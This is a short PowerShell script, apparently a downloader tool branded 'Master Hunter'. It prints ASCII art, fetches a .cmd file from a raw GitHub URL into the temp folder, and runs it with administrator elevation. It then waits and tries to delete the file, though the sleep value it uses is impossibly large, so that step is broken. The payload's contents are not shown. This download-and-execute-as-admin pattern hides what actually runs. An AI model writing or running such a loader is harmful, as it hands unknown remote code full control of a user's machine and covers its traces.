$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
Clear-Host

Write-Host $randomShape -ForegroundColor Cyan

$masterHunterText = @"
                    ____     ____
                  /'    |   |    \
                /    /  |   | \   \
              /    / |  |   |  \   \             Haha
             (   /   |  """"   |\   \       
             | /   / /^\    /^\  \  _|           The Hunter is the best!
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |
                /~~      \/     ~~\
               /   (      |      )  \
         _--_  /,   \____/^\___/'   \  _--_
       /~    ~\ / -____-|_|_|-____-\ /~    ~\
     /________|___/~~~~\___/~~~~\ __|________\
--~~~          ^ |     |   |     |  -     :  ~~~~~:~-_     ___-----~~~~~~~~|
   /             `^-^-^'   `^-^-^'                  :  ~\ /'   ____/--------|
       --                                            ;   |/~~~------~~~~~~~~~|
 ;                                    :              :    |----------/--------|
:                     ,                           ;    .  |---\\--------------|
 :     -                          .                  : : |______________-__|
  :              ,                 ,                :   /'~----___________|
__  \\\        ^                          ,, ;; ;; ;._-~
  ~~~-----____________________________________----~~~
"@

Write-Host $masterHunterText -ForegroundColor Green

$cmdUrl = "https://raw.githubusercontent.com/MasterHunterr/ck/refs/heads/main/Cr/InDwMa.cmd"
$cmdFilePath = "$env:TEMP\InDwMa.cmd"

Invoke-WebRequest -Uri $cmdUrl -OutFile $cmdFilePath

if (Test-Path $cmdFilePath) {
    Write-Host "good now to freedom "
}

Start-Process cmd.exe -ArgumentList "/c `"$cmdFilePath`"" -Verb RunAs

Start-Sleep -Seconds 60000000000000000000000

Remove-Item $cmdFilePath -Force

Start-Sleep -Seconds 3
Exit
